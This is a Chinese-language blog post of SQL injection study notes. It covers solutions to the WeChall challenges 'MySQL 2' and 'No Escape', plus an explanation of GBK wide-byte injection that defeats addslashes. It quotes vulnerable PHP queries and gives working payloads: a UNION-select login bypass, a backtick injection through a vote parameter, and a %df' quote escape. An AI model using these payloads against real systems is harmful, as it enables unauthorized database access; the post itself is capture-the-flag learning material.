---
layout: post
title: "sqli-studying3"
date: 2019-05-16
author: jjnoob
categories:
- 2019-05
tags:
- sqli
---

* content
{:toc}


> 看代码, 理解题目意思, 看writeup, 积累.


# 一. Wechall - MySQL 2
源码:
```php

$db = auth2_db();
	
$password = md5($password);
	
$query = "SELECT * FROM users WHERE username='$username'";
	
if (false === ($result = $db->queryFirst($query))) {
    echo GWF_HTML::error('Auth2', $chall->lang('err_unknown'), false);
    return false;
}
	
	
#############################
### This is the new check ###
if ($result['password'] !== $password) {
	echo GWF_HTML::error('Auth2', $chall->lang('err_password'), false);
	return false;
} #  End of the new code  ###
#############################
```

拿Username去获取结果, 将获得的password与输入的password的md5值进行比较

Username:
```sql
' union select 1, 'admin', 'c4ca4238a0b923820dcc509a6f75849b'# 
```

Password=:
```sql
1
```

其中`md5(1) == c4ca4238a0b923820dcc509a6f75849b`

<br />

# 二. Wechall - No Escape 


## (1) 源码
[题目源码地址](http://www.wechall.net/challenge/no_escape/code.include)

### 按模块来看
1. 连接数据库的函数
2. 创建数据库的函数
3. 重置函数, 将票数置为初始值
4. 主题判断函数
5. 票数增一函数
6. stop100()函数, 如果票数为111则执行solved(), 如果票数为100则重置
7. html表单
8. solved()函数

### 按流程来看
1. 点击vote按钮后, 调用noesc_voteup()
2. noesc_voteup()中, 执行update操作后, 调用noesc_stop100()
3. noesc_stop100(), 先检查票数是否为111, 若是则通过. 接着检查票数是否大于等于100, 若是则清零.

### 解题
源码中的关键
```sql
$query = "UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1";
```

`$who`没有经过任何过滤.

构造:
```php
index.php?vote_for=bill`=111-- `
```
即可.

<br />

# 三. 宽字节注入
[参考](http://www.manongjc.com/article/79150.html)

[参考](https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html)



```sql
$id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;
$sql = "SELECT * FROM news WHERE tid='{$id}'";
$result = mysql_query($sql, $conn) or die(mysql_error()); 
```
addslashes函数, 用于将`$id`的值转义. 

addslashes函数产生的效果就是，让`'`变成`\'`, 让引号变得不再是"单引号", 只是一撇而已。一般绕过方式就是，想办法处理`\'`前面的`\`：

1. 想办法给`\`前面再加一个`\`, 变成`\\'`, 这样`\`被转义了，`'`逃出了限制
2. 想办法把`\`弄没有。

宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字(前一个ascii码要大于128，才到汉字的范围). 

> mysql 在使用GBK 编码的时候，会认为两个字符为一个汉字，例如`%aa%5c` 就是一个汉字(前一个ascii 码大于128 才能到汉字的范围)


所以输入`%df'`时会报错了。我们看到报错，说明sql语句出错，看到出错说明可以注入.

报错的原因就是多了一个单引号, 而单引号前面的反斜杠不见了。

这就是mysql的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以`%df`和后面的`\`也就是`%5c`变成了一个汉字`運'，而`'`逃逸了出来。

不使用`%df`也行, 只要ascii码大于128，基本上就可以了. 比如用`%a1`也可以.

